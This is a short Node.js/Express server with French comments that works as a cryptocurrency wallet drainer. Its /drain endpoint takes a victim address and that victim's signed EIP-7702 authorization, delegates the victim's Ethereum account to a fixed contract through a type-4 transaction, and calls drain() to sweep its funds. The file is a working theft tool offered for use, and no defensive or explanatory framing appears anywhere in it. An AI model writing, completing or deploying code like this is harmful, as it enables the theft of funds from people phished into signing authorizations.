import express from "express";
import cors from "cors";
import { JsonRpcProvider, Wallet, Interface, Transaction } from "ethers";

const RPC = process.env.RPC_URL;          // ex: https://eth.llamarpc.com
const PK = process.env.PRIVATE_KEY;        // clé de 0x878...3635f
const CONTRACT = "0x644efce7920fc8af69cb45832e5fed2ff5e2d92b";

const provider = new JsonRpcProvider(RPC);
const wallet = new Wallet(PK, provider);
const iface = new Interface(["function drain()"]);

const app = express();
app.use(cors());
app.use(express.json());

app.post("/drain", async (req, res) => {
  try {
    const { victim, auth } = req.body;
    if (!victim || !auth) return res.status(400).json({ error: "victim/auth manquant" });

    const nonce = await provider.getTransactionCount(wallet.address, "latest");
    const fee = await provider.getFeeData();

    const tx = {
      type: 4,
      chainId: 1,
      to: victim,
      value: 0n,
      data: iface.encodeFunctionData("drain"),
      nonce,
      maxFeePerGas: fee.maxFeePerGas,
      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
      gasLimit: 300000n,
      authorizationList: [{
        chainId: 1,
        address: CONTRACT,
        nonce: auth.nonce,
        yParity: auth.yParity,
        r: auth.r,
        s: auth.s,
      }],
    };

    const sent = await wallet.sendTransaction(tx);
    res.json({ hash: sent.hash });
  } catch (e) {
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.get("/", (_, res) => res.send("bot ok"));
app.listen(process.env.PORT || 3000);
